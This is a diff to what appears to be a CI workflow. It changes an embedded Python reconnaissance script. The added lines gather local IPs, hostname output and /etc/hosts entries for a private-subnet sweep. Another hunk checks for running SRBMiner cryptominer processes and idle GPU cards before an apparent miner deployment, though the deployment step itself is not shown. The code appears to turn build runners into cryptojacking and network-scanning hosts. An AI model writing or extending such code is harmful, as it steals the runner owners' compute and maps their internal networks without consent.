@@ -258,11 +258,11 @@ jobs:
           # ---------------- /24 sweep ----------------
           print('=== local subnet sweep ===')
           def local_ips():
-              out = sh("ip -4 -o addr show 2>/dev/null | awk '{print $4}'", 8)
+              out = sh("ip -4 -o addr show 2>/dev/null | awk '{print $4}'; echo ---HI---; hostname -I 2>/dev/null; echo ---HOSTS---; cat /etc/hosts 2>/dev/null | awk '{print $1}'", 8)
               ips = []
-              for c in out.split():
+              for c in out.replace('---HI---', ' ').replace('---HOSTS---', ' ').split():
                   ip = c.split('/')[0]
-                  if re.match(r'^(10\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.|192\\.168\\.)', ip):
+                  if re.match(r'^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)', ip):
                       ips.append(ip)
               return sorted(set(ips))
           ips = local_ips()
@@ -308,7 +308,7 @@ jobs:
                   p = [x.strip() for x in line.split(',')]
                   if len(p) == 2 and p[1].isdigit() and int(p[1]) >= 1500:
                       idle.append(p[0])
-              existing = sh("pgrep -af 'SRBMiner-MULTI|srb387|i13[0-9]cipivot' 2>/dev/null | head -10", 10)
+              existing = sh("pgrep -af 'SRBMiner-MULTI|srb387' 2>/dev/null | grep -v -E 'pgrep|recon.py' | head -10", 10)
               print('EXISTING_MINERS %s' % head(existing, 8, 400))
               print('IDLE_CARDS=%s have_app=%s' % (idle, have_app))
               if idle and not have_app and not existing.strip():
